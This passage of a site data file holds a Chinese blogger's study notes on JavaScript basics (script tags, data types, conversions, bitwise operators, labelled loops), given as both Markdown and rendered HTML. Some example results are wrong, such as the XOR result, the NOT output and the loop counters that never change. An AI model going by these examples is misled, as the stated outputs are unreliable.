小结\n通过本章学习，发现许多细节问题之前没有搞清楚，一直使用老方法去引用script。变量命名一直也是随意命名，今后的学习、coding之路，让我更清晰，明了基础的知识","source":"_posts/read-javascript-again-chapter1-3.md","raw":"---\ntitle: JavaScript高级程序设计重读—1-3章\ndate: 2017-07-11 09:03:44\ntags: javascript\ndir: javascript\nkeywords: JavaScript高级程序设计\n---\n### 基本概念\n#### 关于script标签\n```\n<script src=\"/javascripts/application.js\" type=\"text/javascript\" charset=\"utf-8\" async defer></script>\n```\nscript标签共有src，type，charset，async，defer几个属性。在只有script时依然可以作用。\n1、async是可选的，意为立即下载脚本，但不妨碍页面中的其他操作。且其下载后文件的执行顺序不定。\n```\n<script src=\"1.js\" async></script>\n<script src=\"2.js\" async></script>\n```\n其下载后1.js和2.js不定制性。没有一定顺序，可能是1先，也可能是2先执行。\n\n2、charset是指定字符集，在不写的情况下，默认charset为‘utf-8’编码。\n3、type，在不谢的情况下默认值位‘text/javascript’\n4、src属性，src属性并不是非得引用xx.js,而是其只要正确引用返回MIME类型即可。(mime类型：MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。\nMIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。)如果有src属性，则script标签中即使有代码也不会执行。\n\n#### script标签位置\n由于浏览器是由上到下解析内容。如果放在head变迁内，浏览器要等其下载完成后，再去渲染整个页面。因此会有一段时间延迟渲染，造成用户体验差，因此，为了避免这个问题，现代web应用一般是放在body元素中页面内容的后面。加上defer延迟后，将在浏览器解析完成整个页面，即解析完成< /html>之后再执行js代码。\n\n_ps：defer，async都是先下载文件。加载页面完成后执行，但是不同点是defer保证js文件顺序执行，而async则不保证。_\n\n#### 标识符\n规则：\n1、第一个字符必须是字母、下划线，或美元符号\n2、其他字符可以使字母，下划线，美元符号或数字\n最佳采用驼峰式命名\n#### 变量\n未初始化的变量都有一个默认的值，undefined，若未使用var，则其将直接变成全局变量。可以使用逗号分隔，多个变量赋值，即\n```\nvar a = 0,\n    b = 1,\n    c = 2\n```\n#### 数据类型\nJavaScript共有5种基本数据类型和1种复杂数据类型。分别是：\nUndefined，Null，Boolean，Number，String；Object\n##### TYPEOF操作\ntypeof操作只能返回下列字符串\nundefined – 值未定义\nboolean – 布尔值\nstring — 字符串\nnumber – 数值\nobject – 对象或null\nfunction – 函数\n##### Undefined类型\n显示的对一个值赋值为undefined和不初始化某个变量，其都===undefined\n```\nvar message\n// var age   此变量未声明\ntypeof message // undefined\ntypeof age //undefined\n```\n_ps：对未初始化的变量执行typeof操作符会返回undefined，而对未声明的变量执行统一配发操作符同样也会返回undefined值。_\n##### Null类型\nNull类型是表示一个空对象指针，也正是typeof null 返回Object的原因了。因此在声明一个为初始化的对象时，应该赋值为Null,在判断语句if中，null代表false。因此常用其作为未初始对象的赋值\n##### Boolean类型\n| 数据类型 | 转换为true的值 | 转换位为false的值 |\n| --- | --- | --- |\n| Boolean | true | false |\n| String | 任何非空字符串 | “”空字符串 |\n| Number | 任何非零数值(包括无穷大) | 0和NaN |\n| Object | 任何对象 | null |\n| Undefined | 不存在的 | undefined |\n##### Number类型\n1、如果前缀为 0，则 JavaScript 会把数值常量解释为八进制数，如果前缀为 0 和 “x”，则解释为十六进制数。即\n```\nvar octalNum = 070 // 56\nvar hexNum1 = 0xA //10\n```\n在进行算术运算时其右会转化成10进制\n2、JavaScript中+0和-0是相等的\n3、由于浮点数的数值计算产生误差，即0.1 + 0.2 = 0.30000000000000004是因为给予IEEE754数值的浮点数计算的通病(详见：计算机系统基础－－第二章(数据的机器级表示与处理) – 浮点数的表示)\n4、由于浮点数的表示范围有限，因此其表示范围有Number.MIN_VALUE(最小值)和Number.MAX_VALUE(最大值)表示。采用isFinite()函数判断其是否溢出\n5、NaN表示not a number 是一个特殊的值，表示其转换不是一个数值。任何数值的算术运算对NaN的结果都是NaN，且NaN不等于其本身。判断是否是NaN有专门函数isNaN()来判断。传入参数会先尝试转换成number再判断。而测试对象时先调用对象的valueOf方法，在确定是否可以转换成数值，如果不能，再调用toString方法。在测试返回值。\n6、数值转换函数Number(),规则如下\n```\n(1)boolean,true转换成1，false转换成0\n(2)数值，简单传入和返回\n(3)null，返回0\n(4)undefined，返回NaN\n(5)字符串：   <1>转换为十进制数，并且将前面多余的0去除\n             <2>浮点数格式相同\n             <3>如果包含0x、0o，将其转换成10进制数\n             <4>空字符串转换为0\n             <5>其他格式外都转换成NaN\n(6)对象，先调用valueOf()方法，然后依照返回值，如果是NaN，则调用对象toString方法，再根据前面返回字符串\n```\n7、parseInt()，parseFloat()函数\nparseInt也是将传入参数转换成数值，与Number函数不同的地方是，parseInt函数会选取从首字符开始的数值，到非数值字符结束，即parseInt(‘123abc’)转换成123，而Number转换成NaN。\nparseInt可以接受第二个参数，代表转换成的基于格式。即\n```\nparseInt('10',2)  // 2\n```\n基于格式格式转化成相应十进制数\n##### String类型\n1、字符字面量，例如\\n(换行),\\t(制表)等等。这些字面量在字符串的任意位置都会被当做字符来解析。例如\n```\nvar a = '\\t\\t\\t'\na.length // 3\n```\n而a打印出来是三个制表\n2、字符串的特点。\n```\nvar lang = 'Java'\nlang = lang + 'Script'\n```\n开始时lang保存字符串Java，而第二行把lang的值重新定义为Java和script结合，这个操作首先创建一个能容纳10个字符的新字符串，然后在这个字符串中填入java 和script，最后一步是销毁原来的字符串java和字符串script。\n3、字符串的转换\n利用toString方法来将数值转化成string，而其参数是转化成不同进制\n```\nvar num = 11\nnum.toString() // '11'\nvar nums = 10\nnums.toString(2) // '1010'\n```\n在不是null和undefined的情况下，还可以调用String()函数其转换规则如下\n1、如果值有toString方法，调用其不带参数的toString方法\n2、如果值是null，返回’null’\n3、如果是undefined，返回’undefined’\n##### Object类型\n可以使用 var o = new Object()或者使用var o = new Object来构造Object实例。每个Object实例都有下列属性和方法\n1、constructor 保存着创建当前对象的函数\n2、hasOwnProperty 用于检查给定的属性在当前实例中(而不是实例的原型中)\n3、isPrototypeOf 用于检查传入的对象是否是当前对象的原型\n4、propertyIsEnumerable 用于检查给定的属性是否能用for-in语句来枚举\n5、toLocaleString 返回对象的字符串表示，该字符串与执行环境的地区对应\n6、toString 返回对象的字符串表示\n7、valueOf 返回对象的字符串、数值或布尔值\n##### 位操作符\n1、按位非 (NOT) ~\n```\nvar num1 = 25   // 二进制00000000000000000000000000011001\nvar num2 = ~num1// 二进制11111111111111111111111111100110\nnum2            // ~26\n```\n2、按位与 (AND) &\n```\nvar result = 25 & 3\nresult  // 1\n25 = 0000 0000 0000 0000 0000 0000 0001 1001\n3 =  0000 0000 0000 0000 0000 0000 0000 0011\n----------------------------------------------\nAND= 0000 0000 0000 0000 0000 0000 0000 0001\n```\n3、按位或 (OR) |\n```\nvar result = 25 | 3\nresult  // 27\n25 = 0000 0000 0000 0000 0000 0000 0001 1001\n3 =  0000 0000 0000 0000 0000 0000 0000 0011\n----------------------------------------------\nAND= 0000 0000 0000 0000 0000 0000 0001 1011\n```\n4、按位异或 (XOR) ^\n```\nvar result = 25 ^ 3\nresult  // 27\n25 = 0000 0000 0000 0000 0000 0000 0001 1001\n3 =  0000 0000 0000 0000 0000 0000 0000 0011\n----------------------------------------------\nAND= 0000 0000 0000 0000 0000 0000 0001 1010\n```\n5、 操作符\n```\n25**2 = 625\n```\n**代表次方\n#### 语句\nlabel语句结合break，continue语句\n```\nvar num = 0;\noutermost:\n    for (var i = 0; i < 10; i++) {\n        for (var j = 0; j < 10; j++) {\n            if (i == 5 && j == 5) {\n               break outermost\n            }\n        }\n    }\nnum // 55\nvar num = 0;\noutermost:\n    for (var i = 0; i < 10; i++) {\n        for (var j = 0; j < 10; j++) {\n            if (i == 5 && j == 5) {\n               continue outermost\n            }\n        }\n    }\nnum // 95\n```\nlable结合break，continue语句可以控制跳出位置\n#### with语句\n将代码作用域设定到特定对象中。\n```\nvar qs = location.search.substring(1)\nvar hostName = location.hostname\nvar url = location.href\n//使用with语句后\nwith(location){\n    var qs = search.substring(1)\n    var hostName = hostname\n    var url = href\n}\n```\n\n#### 小结\n通过本章学习，发现许多细节问题之前没有搞清楚，一直使用老方法去引用script。变量命名一直也是随意命名，今后的学习、coding之路，让我更清晰，明了基础的知识","slug":"read-javascript-again-chapter1-3","published":1,"updated":"2021-10-13T15:50:16.488Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz06000x4jzxgdj30cc9","content":"<h3 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h3><h4 id=\"关于script标签\"><a href=\"#关于script标签\" class=\"headerlink\" title=\"关于script标签\"></a>关于script标签</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;/javascripts/application.js&quot; type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; async defer&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>script标签共有src，type，charset，async，defer几个属性。在只有script时依然可以作用。<br>1、async是可选的，意为立即下载脚本，但不妨碍页面中的其他操作。且其下载后文件的执行顺序不定。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;1.js&quot; async&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=&quot;2.js&quot; async&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p></p><p>其下载后1.js和2.js不定制性。没有一定顺序，可能是1先，也可能是2先执行。</p><p>2、charset是指定字符集，在不写的情况下，默认charset为‘utf-8’编码。<br>3、type，在不谢的情况下默认值位‘text/javascript’<br>4、src属性，src属性并不是非得引用xx.js,而是其只要正确引用返回MIME类型即可。(mime类型：MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。)如果有src属性，则script标签中即使有代码也不会执行。</p><h4 id=\"script标签位置\"><a href=\"#script标签位置\" class=\"headerlink\" title=\"script标签位置\"></a>script标签位置</h4><p>由于浏览器是由上到下解析内容。如果放在head变迁内，浏览器要等其下载完成后，再去渲染整个页面。因此会有一段时间延迟渲染，造成用户体验差，因此，为了避免这个问题，现代web应用一般是放在body元素中页面内容的后面。加上defer延迟后，将在浏览器解析完成整个页面，即解析完成&lt; /html&gt;之后再执行js代码。</p><p><em>ps：defer，async都是先下载文件。加载页面完成后执行，但是不同点是defer保证js文件顺序执行，而async则不保证。</em></p><h4 id=\"标识符\"><a href=\"#标识符\" class=\"headerlink\" title=\"标识符\"></a>标识符</h4><p>规则：<br>1、第一个字符必须是字母、下划线，或美元符号<br>2、其他字符可以使字母，下划线，美元符号或数字<br>最佳采用驼峰式命名</p><h4 id=\"变量\"><a href=\"#变量\" class=\"headerlink\" title=\"变量\"></a>变量</h4><p>未初始化的变量都有一个默认的值，undefined，若未使用var，则其将直接变成全局变量。可以使用逗号分隔，多个变量赋值，即<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = 0,</span><br><span class=\"line\">    b = 1,</span><br><span class=\"line\">    c = 2</span><br></pre></td></tr></table></figure><p></p><h4 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h4><p>JavaScript共有5种基本数据类型和1种复杂数据类型。分别是：<br>Undefined，Null，Boolean，Number，String；Object</p><h5 id=\"TYPEOF操作\"><a href=\"#TYPEOF操作\" class=\"headerlink\" title=\"TYPEOF操作\"></a>TYPEOF操作</h5><p>typeof操作只能返回下列字符串<br>undefined – 值未定义<br>boolean – 布尔值<br>string — 字符串<br>number – 数值<br>object – 对象或null<br>function – 函数</p><h5 id=\"Undefined类型\"><a href=\"#Undefined类型\" class=\"headerlink\" title=\"Undefined类型\"></a>Undefined类型</h5><p>显示的对一个值赋值为undefined和不初始化某个变量，其都===undefined<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var message</span><br><span class=\"line\">// var age   此变量未声明</span><br><span class=\"line\">typeof message // undefined</span><br><span class=\"line\">typeof age //undefined</span><br></pre></td></tr></table></figure><p></p><p><em>ps：对未初始化的变量执行typeof操作符会返回undefined，而对未声明的变量执行统一配发操作符同样也会返回undefined值。</em></p><h5 id=\"Null类型\"><a href=\"#Null类型\" class=\"headerlink\" title=\"Null类型\"></a>Null类型</h5><p>Null类型是表示一个空对象指针，也正是typeof null 返回Object的原因了。因此在声明一个为初始化的对象时，应该赋值为Null,在判断语句if中，null代表false。因此常用其作为未初始对象的赋值</p><h5 id=\"Boolean类型\"><a href=\"#Boolean类型\" class=\"headerlink\" title=\"Boolean类型\"></a>Boolean类型</h5><table><thead><tr><th>数据类型</th><th>转换为true的值</th><th>转换位为false的值</th></tr></thead><tbody><tr><td>Boolean</td><td>true</td><td>false</td></tr><tr><td>String</td><td>任何非空字符串</td><td>“”空字符串</td></tr><tr><td>Number</td><td>任何非零数值(包括无穷大)</td><td>0和NaN</td></tr><tr><td>Object</td><td>任何对象</td><td>null</td></tr><tr><td>Undefined</td><td>不存在的</td><td>undefined</td></tr></tbody></table><h5 id=\"Number类型\"><a href=\"#Number类型\" class=\"headerlink\" title=\"Number类型\"></a>Number类型</h5><p>1、如果前缀为 0，则 JavaScript 会把数值常量解释为八进制数，如果前缀为 0 和 “x”，则解释为十六进制数。即<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var octalNum = 070 // 56</span><br><span class=\"line\">var hexNum1 = 0xA //10</span><br></pre></td></tr></table></figure><p></p><p>在进行算术运算时其右会转化成10进制<br>2、JavaScript中+0和-0是相等的<br>3、由于浮点数的数值计算产生误差，即0.1 + 0.2 = 0.30000000000000004是因为给予IEEE754数值的浮点数计算的通病(详见：计算机系统基础－－第二章(数据的机器级表示与处理) – 浮点数的表示)<br>4、由于浮点数的表示范围有限，因此其表示范围有Number.MIN_VALUE(最小值)和Number.MAX_VALUE(最大值)表示。采用isFinite()函数判断其是否溢出<br>5、NaN表示not a number 是一个特殊的值，表示其转换不是一个数值。任何数值的算术运算对NaN的结果都是NaN，且NaN不等于其本身。判断是否是NaN有专门函数isNaN()来判断。传入参数会先尝试转换成number再判断。而测试对象时先调用对象的valueOf方法，在确定是否可以转换成数值，如果不能，再调用toString方法。在测试返回值。<br>6、数值转换函数Number(),规则如下<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(1)boolean,true转换成1，false转换成0</span><br><span class=\"line\">(2)数值，简单传入和返回</span><br><span class=\"line\">(3)null，返回0</span><br><span class=\"line\">(4)undefined，返回NaN</span><br><span class=\"line\">(5)字符串：   &lt;1&gt;转换为十进制数，并且将前面多余的0去除</span><br><span class=\"line\">             &lt;2&gt;浮点数格式相同</span><br><span class=\"line\">             &lt;3&gt;如果包含0x、0o，将其转换成10进制数</span><br><span class=\"line\">             &lt;4&gt;空字符串转换为0</span><br><span class=\"line\">             &lt;5&gt;其他格式外都转换成NaN</span><br><span class=\"line\">(6)对象，先调用valueOf()方法，然后依照返回值，如果是NaN，则调用对象toString方法，再根据前面返回字符串</span><br></pre></td></tr></table></figure><p></p><p>7、parseInt()，parseFloat()函数<br>parseInt也是将传入参数转换成数值，与Number函数不同的地方是，parseInt函数会选取从首字符开始的数值，到非数值字符结束，即parseInt(‘123abc’)转换成123，而Number转换成NaN。<br>parseInt可以接受第二个参数，代表转换成的基于格式。即<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parseInt(&apos;10&apos;,2)  // 2</span><br></pre></td></tr></table></figure><p></p><p>基于格式格式转化成相应十进制数</p><h5 id=\"String类型\"><a href=\"#String类型\" class=\"headerlink\" title=\"String类型\"></a>String类型</h5><p>1、字符字面量，例如\\n(换行),\\t(制表)等等。这些字面量在字符串的任意位置都会被当做字符来解析。例如<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = &apos;\\t\\t\\t&apos;</span><br><span class=\"line\">a.length // 3</span><br></pre></td></tr></table></figure><p></p><p>而a打印出来是三个制表<br>2、字符串的特点。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var lang = &apos;Java&apos;</span><br><span class=\"line\">lang = lang + &apos;Script&apos;</span><br></pre></td></tr></table></figure><p></p><p>开始时lang保存字符串Java，而第二行把lang的值重新定义为Java和script结合，这个操作首先创建一个能容纳10个字符的新字符串，然后在这个字符串中填入java 和script，最后一步是销毁原来的字符串java和字符串script。<br>3、字符串的转换<br>利用toString方法来将数值转化成string，而其参数是转化成不同进制<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var num = 11</span><br><span class=\"line\">num.toString() // &apos;11&apos;</span><br><span class=\"line\">var nums = 10</span><br><span class=\"line\">nums.toString(2) // &apos;1010&apos;</span><br></pre></td></tr></table></figure><p></p><p>在不是null和undefined的情况下，还可以调用String()函数其转换规则如下<br>1、如果值有toString方法，调用其不带参数的toString方法<br>2、如果值是null，返回’null’<br>3、如果是undefined，返回’undefined’</p><h5 id=\"Object类型\"><a href=\"#Object类型\" class=\"headerlink\" title=\"Object类型\"></a>Object类型</h5><p>可以使用 var o = new Object()或者使用var o = new Object来构造Object实例。每个Object实例都有下列属性和方法<br>1、constructor 保存着创建当前对象的函数<br>2、hasOwnProperty 用于检查给定的属性在当前实例中(而不是实例的原型中)<br>3、isPrototypeOf 用于检查传入的对象是否是当前对象的原型<br>4、propertyIsEnumerable 用于检查给定的属性是否能用for-in语句来枚举<br>5、toLocaleString 返回对象的字符串表示，该字符串与执行环境的地区对应<br>6、toString 返回对象的字符串表示<br>7、valueOf 返回对象的字符串、数值或布尔值</p><h5 id=\"位操作符\"><a href=\"#位操作符\" class=\"headerlink\" title=\"位操作符\"></a>位操作符</h5><p>1、按位非 (NOT) ~<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var num1 = 25   // 二进制00000000000000000000000000011001</span><br><span class=\"line\">var num2 = ~num1// 二进制11111111111111111111111111100110</span><br><span class=\"line\">num2            // ~26</span><br></pre></td></tr></table></figure><p></p><p>2、按位与 (AND) &amp;<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var result = 25 &amp; 3</span><br><span class=\"line\">result  // 1</span><br><span class=\"line\">25 = 0000 0000 0000 0000 0000 0000 0001 1001</span><br><span class=\"line\">3 =  0000 0000 0000 0000 0000 0000 0000 0011</span><br><span class=\"line\">----------------------------------------------</span><br><span class=\"line\">AND= 0000 0000 0000 0000 0000 0000 0000 0001</span><br></pre></td></tr></table></figure><p></p><p>3、按位或 (OR) |<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var result = 25 | 3</span><br><span class=\"line\">result  // 27</span><br><span class=\"line\">25 = 0000 0000 0000 0000 0000 0000 0001 1001</span><br><span class=\"line\">3 =  0000 0000 0000 0000 0000 0000 0000 0011</span><br><span class=\"line\">----------------------------------------------</span><br><span class=\"line\">AND= 0000 0000 0000 0000 0000 0000 0001 1011</span><br></pre></td></tr></table></figure><p></p><p>4、按位异或 (XOR) ^<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var result = 25 ^ 3</span><br><span class=\"line\">result  // 27</span><br><span class=\"line\">25 = 0000 0000 0000 0000 0000 0000 0001 1001</span><br><span class=\"line\">3 =  0000 0000 0000 0000 0000 0000 0000 0011</span><br><span class=\"line\">----------------------------------------------</span><br><span class=\"line\">AND= 0000 0000 0000 0000 0000 0000 0001 1010</span><br></pre></td></tr></table></figure><p></p><p>5、 操作符<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">25**2 = 625</span><br></pre></td></tr></table></figure><p></p><p>**代表次方</p><h4 id=\"语句\"><a href=\"#语句\" class=\"headerlink\" title=\"语句\"></a>语句</h4><p>label语句结合break，continue语句<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var num = 0;</span><br><span class=\"line\">outermost:</span><br><span class=\"line\">    for (var i = 0; i &lt; 10; i++) &#123;</span><br><span class=\"line\">        for (var j = 0; j &lt; 10; j++) &#123;</span><br><span class=\"line\">            if (i == 5 &amp;&amp; j == 5) &#123;</span><br><span class=\"line\">               break outermost</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">num // 55</span><br><span class=\"line\">var num = 0;</span><br><span class=\"line\">outermost:</span><br><span class=\"line\">    for (var i = 0; i &lt; 10; i++) &#123;</span><br><span class=\"line\">        for (var j = 0; j &lt; 10; j++) &#123;</span><br><span class=\"line\">            if (i == 5 &amp;&amp; j == 5) &#123;</span><br><span class=\"line\">               continue outermost</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">num // 95</span><br></pre></td></tr></table></figure><p></p><p>lable结合break，continue语句可以控制跳出位置</p><h4 id=\"with语句\"><a href=\"#with语句\" class=\"headerlink\" title=\"with语句\"></a>with语句</h4><p>将代码作用域设定到特定对象中。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var qs = location.search.substring(1)</span><br><span class=\"line\">var hostName = location.hostname</span><br><span class=\"line\">var url = location.href</span><br><span class=\"line\">//使用with语句后</span><br><span class=\"line\">with(location)&#123;</span><br><span class=\"line\">    var qs = search.substring(1)</span><br><span class=\"line\">    var hostName = hostname</span><br><span class=\"line\">    var url = href</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>通过本章学习，发现许多细节问题之前没有搞清楚，一直使用老方法去引用script。变量命名一直也是随意命名，今后的学习、coding之路，让我更清晰，明了基础的知识</p>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h3><h4 id=\"关于script标签\"><a href=\"#关于script标签\" class=\"headerlink\" title=\"关于script标签\"></a>关于script标签</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;/javascripts/application.js&quot; type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; async defer&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>script标签共有src，type，charset，async，defer几个属性。在只有script时依然可以作用。<br>1、async是可选的，意为立即下载脚本，但不妨碍页面中的其他操作。且其下载后文件的执行顺序不定。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;1.js&quot; async&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=&quot;2.js&quot; async&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p></p><p>其下载后1.js和2.js不定制性。没有一定顺序，可能是1先，也可能是2先执行。</p><p>2、charset是指定字符集，在不写的情况下，默认charset为‘utf-8’编码。<br>3、type，在不谢的情况下默认值位‘text/javascript’<br>4、src属性，src属性并不是非得引用xx.js,而是其只要正确引用返回MIME类型即可。(mime类型：MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。)如果有src属性，则script标签中即使有代码也不会执行。</p><h4 id=\"script标签位置\"><a href=\"#script标签位置\" class=\"headerlink\" title=\"script标签位置\"></a>script标签位置</h4><p>由于浏览器是由上到下解析内容。如果放在head变迁内，浏览器要等其下载完成后，再去渲染整个页面。因此会有一段时间延迟渲染，造成用户体验差，因此，为了避免这个问题，现代web应用一般是放在body元素中页面内容的后面。加上defer延迟后，将在浏览器解析完成整个页面，即解析完成&lt; /html&gt;之后再执行js代码。</p><p><em>ps：defer，async都是先下载文件。加载页面完成后执行，但是不同点是defer保证js文件顺序执行，而async则不保证。</em></p><h4 id=\"标识符\"><a href=\"#标识符\" class=\"headerlink\" title=\"标识符\"></a>标识符</h4><p>规则：<br>1、第一个字符必须是字母、下划线，或美元符号<br>2、其他字符可以使字母，下划线，美元符号或数字<br>最佳采用驼峰式命名</p><h4 id=\"变量\"><a href=\"#变量\" class=\"headerlink\" title=\"变量\"></a>变量</h4><p>未初始化的变量都有一个默认的值，undefined，若未使用var，则其将直接变成全局变量。可以使用逗号分隔，多个变量赋值，即<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = 0,</span><br><span class=\"line\">    b = 1,</span><br><span class=\"line\">    c = 2</span><br></pre></td></tr></table></figure><p></p><h4 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h4><p>JavaScript共有5种基本数据类型和1种复杂数据类型。分别是：<br>Undefined，Null，Boolean，Number，String；Object</p><h5 id=\"TYPEOF操作\"><a href=\"#TYPEOF操作\" class=\"headerlink\" title=\"TYPEOF操作\"></a>TYPEOF操作</h5><p>typeof操作只能返回下列字符串<br>undefined – 值未定义<br>boolean – 布尔值<br>string — 字符串<br>number – 数值<br>object – 对象或null<br>function – 函数</p><h5 id=\"Undefined类型\"><a href=\"#Undefined类型\" class=\"headerlink\" title=\"Undefined类型\"></a>Undefined类型</h5><p>显示的对一个值赋值为undefined和不初始化某个变量，其都===undefined<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var message</span><br><span class=\"line\">// var age   此变量未声明</span><br><span class=\"line\">typeof message // undefined</span><br><span class=\"line\">typeof age //undefined</span><br></pre></td></tr></table></figure><p></p><p><em>ps：对未初始化的变量执行typeof操作符会返回undefined，而对未声明的变量执行统一配发操作符同样也会返回undefined值。</em></p><h5 id=\"Null类型\"><a href=\"#Null类型\" class=\"headerlink\" title=\"Null类型\"></a>Null类型</h5><p>Null类型是表示一个空对象指针，也正是typeof null 返回Object的原因了。因此在声明一个为初始化的对象时，应该赋值为Null,在判断语句if中，null代表false。因此常用其作为未初始对象的赋值</p><h5 id=\"Boolean类型\"><a href=\"#Boolean类型\" class=\"headerlink\" 